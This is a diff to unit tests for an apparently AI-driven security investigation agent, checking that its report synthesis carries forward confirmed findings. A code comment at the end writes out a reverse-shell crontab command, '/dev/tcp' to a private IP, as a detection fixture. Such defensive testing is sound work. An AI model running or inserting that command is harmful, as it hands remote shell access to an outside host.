@@ -26,8 +26,8 @@ from agent.runtime.graph import (
     pivot,
     use_tools,
 )
-from agent.runtime.graph.nodes_flow import _merge_preserved_findings
-from langchain_core.messages import AIMessage
+from agent.runtime.graph.nodes_flow import _merge_preserved_findings, _synthesize_investigation_report
+from langchain_core.messages import AIMessage, HumanMessage, SystemMessage, ToolMessage
 
 
 class EventSearchTool:
@@ -96,6 +96,39 @@ class TestFindingsBoard(unittest.TestCase):
         self.assertIn("event e1 confirmed privileged local execution", merged)
         self.assertNotIn("- None.\n\n## Hypotheses", merged)
         self.assertIn("## Hypotheses", merged)
+
+    def test_report_synthesis_feeds_model_its_confirmed_findings(self):
+        # Root fix for the routine post-hoc restoration: the synthesis prompt must hand the
+        # model the ledger's confirmed findings so it writes them in (and reasons from them)
+        # rather than re-deriving from raw evidence and dropping them.
+        captured = {}
+
+        class _CapturingModel:
+            def bind_tools(self, _tools):
+                return self
+
+            async def ainvoke(self, msgs):
+                captured["msgs"] = msgs
+                return AIMessage(content="## Findings\n- x [e9]\n\n## Hypotheses\n- None.\n\n## New Leads\n- None.\n")
+
+        state = {
+            "agent_name": "investigation",
+            "messages": [SystemMessage(content="sys"), ToolMessage(name="search", tool_call_id="t", content="{}")],
+            "ctx_tokens": 0,
+            "last_confirmed_findings": [],
+            "task_ledger": {
+                "confirmed_findings": [
+                    {"summary": "reverse shell to 10.0.2.5 confirmed", "event_ids": ["e9"]},
+                ],
+            },
+        }
+        cfg = {"configurable": {"model": _CapturingModel(), "system_prompt": "sys"}}
+        report, _ = asyncio.run(_synthesize_investigation_report(state, cfg, "inv", 0))
+        prompt = "\n".join(getattr(m, "content", "") for m in captured["msgs"] if isinstance(m, HumanMessage))
+        self.assertIn("reverse shell to 10.0.2.5 confirmed", prompt)
+        self.assertIn("e9", prompt)
+        self.assertIn("ALREADY CONFIRMED", prompt)
+        self.assertTrue(report.startswith("## Findings"))
 
     def test_hex_encoded_reverse_shell_is_decoded_as_command_artifact(self):
         # Crontab entry stored as hex: sh -i >& /dev/tcp/10.0.2.5/5555 0>&1
